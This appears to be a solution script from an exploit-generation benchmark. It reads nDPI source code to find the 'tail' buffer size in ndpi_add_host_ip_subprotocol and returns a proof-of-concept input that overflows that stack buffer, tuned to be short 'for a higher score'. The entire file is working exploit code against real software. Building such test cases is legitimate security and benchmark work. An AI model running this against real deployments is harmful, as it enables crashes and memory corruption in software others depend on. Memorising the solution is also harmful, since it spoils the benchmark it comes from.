import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Default values based on common configurations of this vulnerability
        tail_size = 32
        use_slash = True
        
        try:
            with tarfile.open(src_path, 'r') as tar:
                # Locate ndpi_main.c
                target_member = None
                for member in tar.getmembers():
                    if member.name.endswith('ndpi_main.c'):
                        target_member = member
                        break
                
                if target_member:
                    f = tar.extractfile(target_member)
                    content = f.read().decode('utf-8', errors='ignore')
                    
                    # Locate the vulnerable function
                    fn_idx = content.find('ndpi_add_host_ip_subprotocol')
                    if fn_idx != -1:
                        # Extract a chunk of the function body
                        chunk = content[fn_idx:fn_idx+4096]
                        
                        # Find the size of the 'tail' buffer
                        # Regex to match declaration like: char tail[32]; or char ip[20], tail[32];
                        size_match = re.search(r'tail\s*\[\s*(\d+)\s*\]', chunk)
                        if size_match:
                            tail_size = int(size_match.group(1))
                        
                        # Determine the separator used in sscanf/scanf_common
                        # Look for lines containing sscanf-like calls and 'tail'
                        lines = chunk.split('\n')
                        for line in lines:
                            if ('sscanf' in line or 'scanf_common' in line) and 'tail' in line:
                                # Extract format string
                                fmt_match = re.search(r'"([^"]+)"', line)
                                if fmt_match:
                                    fmt = fmt_match.group(1)
                                    if '/' in fmt:
                                        use_slash = True
                                        break
                                    elif ' ' in fmt and '/' not in fmt:
                                        use_slash = False
                                        break
        except Exception:
            pass
            
        # Generate PoC
        # To trigger ASAN stack-buffer-overflow, writing just past the buffer is sufficient.
        # We add a small amount of overflow (e.g. 1-4 bytes) to ensure the crash
        # while keeping the PoC short for a higher score.
        payload = b"A" * (tail_size + 4)
        
        if use_slash:
            # Format: IP/Overflow
            return b"1.1.1.1/" + payload
        else:
            # Format: IP Overflow
            return b"1.1.1.1 " + payload